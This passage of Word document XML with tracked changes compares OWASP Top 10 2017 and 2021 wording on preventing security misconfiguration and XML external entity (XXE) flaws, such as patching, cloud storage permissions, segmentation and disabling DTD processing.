      <w:del w:id="1929" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="693424CC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1930" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1931" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> A task to review and update the configurations appropriate to all</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10748B91" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1932" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1933" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> security notes, updates</w:t>
      </w:r>
      <w:ins w:id="1934" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and patches as part of the patch management</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="621AEAE7" w14:textId="40345C76" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1935" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> process (see </w:t>
      </w:r>
      <w:del w:id="1936" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>**A9:2017-Using</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1937" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[A06:2021-Vulnerable and Outdated</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Components</w:t>
      </w:r>
      <w:del w:id="1938" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve"> with Known Vulnerabilities**). In particular, review</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1939" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">](A06_2021-Vulnerable_and_Outdated_Components.md)). Review    </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> cloud storage permissions (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="1940" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1941" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> S3 bucket permissions).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB286B8" w14:textId="33CBE366" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1942" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1943" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="04E722C7" w14:textId="2F22C33F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1944" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1945" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> A segmented application architecture </w:t>
      </w:r>
      <w:del w:id="1946" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>provides effective</w:t>
      </w:r>
      <w:del w:id="1947" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>,</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1948" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> and</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> secure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322DEF48" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1949" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1950" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> separation between components or tenants, with segmentation,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27415F78" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1951" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> containerization, or cloud security groups (ACLs).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F84EEC" w14:textId="63A90C4B" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1952" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1953" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7DF85C6B" w14:textId="0CA20D30" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1954" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sending security directives to clients, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="1955" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>. [</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1956" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">., </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Security Headers</w:t>
      </w:r>
      <w:del w:id="1957" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="003E073E" w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project).</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1958" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3BFE66EA" w14:textId="3FE09A3E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003E073E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1959" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1960" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="29BEE42B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1961" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1962" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> An automated process to verify the effectiveness of the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B441233" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1963" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00AC649A">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> configurations and settings in all environments.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7AFA6F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="00841D1E" w:rsidP="00AC649A">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19E206F6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00AC649A" w:rsidRDefault="003E073E" w:rsidP="00096903">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="1964" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1965" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003E073E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A4:2017 XML External Entities (XXE)</w:delText>
        </w:r>
      </w:del>
      <w:moveFromRangeStart w:id="1966" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923160"/>
    </w:p>
    <w:p w14:paraId="03B527A9" w14:textId="77777777" w:rsidR="005C43E9" w:rsidRPr="005C43E9" w:rsidRDefault="00841D1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67" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="1968" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00AC649A">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## How </w:t>
        </w:r>
      </w:moveFrom>
      <w:moveFromRangeEnd w:id="1966"/>
      <w:del w:id="1969" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="005C43E9" w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>To Prevent</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="57BF3039"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70" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CA9CC87"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71" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1972" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>Developer training is essential to identify and mitigate XXE. Besides that, preventing XXE requires:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="79183E5E"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73" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="321D887F"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74" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1975" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* Whenever possible, use less complex data formats such as JSON, and avoiding serialization of sensitive data.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="320A3CCA"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76" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1977" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* Patch or upgrade all XML processors and libraries in use by the application or on the underlying operating system. Use dependency checkers. Update SOAP to SOAP 1.2 or higher.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4DCAE441"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78" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1979" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText xml:space="preserve">* Disable XML external entity and DTD processing in all XML parsers in the application, as per the [OWASP Cheat Sheet 'XXE Prevention'](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet). </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7BA36767"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80" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="de-DE"/>
          <w14:ligatures w14:val="none"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1981" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="005C43E9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:eastAsia="Times New Roman" w:hAnsi="Arial" w:cs="Arial"/>
            <w:kern w:val="0"/>
            <w:lang w:val="en-US" w:eastAsia="de-DE"/>
            <w14:ligatures w14:val="none"/>
          </w:rPr>
          <w:delText>* Implement positive ("whitelisting") server-side input validation, filtering, or sanitization to prevent hostile data within XML documents, headers, or nodes.</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="46C2D9CC"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82" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
